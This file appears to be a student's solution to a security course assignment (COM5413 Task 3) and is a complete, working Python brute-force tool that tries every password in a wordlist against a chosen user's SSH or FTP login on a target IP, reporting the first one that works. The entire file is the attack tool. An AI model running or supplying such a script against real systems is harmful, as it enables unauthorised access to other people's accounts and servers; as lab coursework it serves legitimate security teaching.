"""
================================================================================
COM5413 — The Benji Protocol
Task 3: The Access Validator
File:   brute.py
================================================================================
...
================================================================================
"""

# Your imports go here
import argparse               #import all libraries needed 
import ftplib
import sys
import time
from datetime import datetime
from pathlib import Path

try:                   #try importing paramiko -SSH library
    import paramiko
except ImportError:
    print("[-] paramiko not installed. Run: pip install paramiko", file=sys.stderr)
    sys.exit(1)


def parse_arguments():            #parse command line arguments 
    parser = argparse.ArgumentParser(description="Brute force validator")

    parser.add_argument("target", help="Target IP address")    #target IP
    parser.add_argument("--service", required=True, choices=["ssh", "ftp"])       #choose service type SSH or FTP 
    parser.add_argument("--user", required=True)       #username for login 
    parser.add_argument("--wordlist", required=True, type=Path)    #path to wordlist file 
    parser.add_argument("--port", type=int, default=None)   #original port number 

    return parser.parse_args()


def load_wordlist(wordlist_path: Path) -> list[str]:      #load password for word list
    if not wordlist_path.exists():
        raise FileNotFoundError("Wordlist not found")

    with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
        words = []
        for line in f:
            line = line.strip()
            if line:
                words.append(line)

    return words


def attempt_ftp(target: str, user: str, password: str, port: int) -> bool:
    try:
        ftp = ftplib.FTP()
        ftp.connect(target, port, timeout=3)
        ftp.login(user=user, passwd=password)
        ftp.quit()
        return True
    except Exception:
        return False


def attempt_ssh(target: str, user: str, password: str) -> bool:
    client = None
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        client.connect(
            hostname=target,
            username=user,
            password=password,
            timeout=5,
            banner_timeout=10,
            auth_timeout=10,
            allow_agent=False,
            look_for_keys=False,
        )

        return True

    except (paramiko.ssh_exception.SSHException, EOFError, OSError):
        return False

    except Exception:
        return False

    finally:
        try:
            if client:
                client.close()
        except:
            pass


def main():
    args = parse_arguments()

    try:
        passwords = load_wordlist(args.wordlist)
        print(f"[DEBUG] Loaded {len(passwords)} passwords")
    except Exception as e:
        print(f"[ERROR] Failed to load wordlist: {e}")
        sys.exit(1)

    for password in passwords:

        print(f"Trying password: {password}")
        sys.stdout.flush()

        time.sleep(0.2)

        if args.service == "ftp":
            port = args.port if args.port else 21
            success = attempt_ftp(args.target, args.user, password, port)
        else:
            success = attempt_ssh(args.target, args.user, password)

        if success:
            print(f"[+] SUCCESS: Password found: {password}")
            return

    print(f"[-] EXHAUSTED: No valid credentials found for user {args.user}")


if __name__ == "__main__":
    main()